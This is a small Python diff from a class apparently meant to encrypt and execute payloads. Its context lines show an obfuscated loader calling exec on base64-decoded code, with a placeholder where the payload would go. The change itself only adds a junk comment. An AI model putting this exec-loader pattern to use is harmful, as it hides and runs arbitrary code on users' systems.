@@ -42,3 +42,11 @@ class ASChipher(object):
 x = ASChipher("kaowlsdoaoaoak")
 x.exec_payload(x.encrypt("""import base64 ; exec(base64.b64decode('__re__'))"""))
 
+"""
+comments
+ig
+nore
+this
+shiet
+omg
+"""
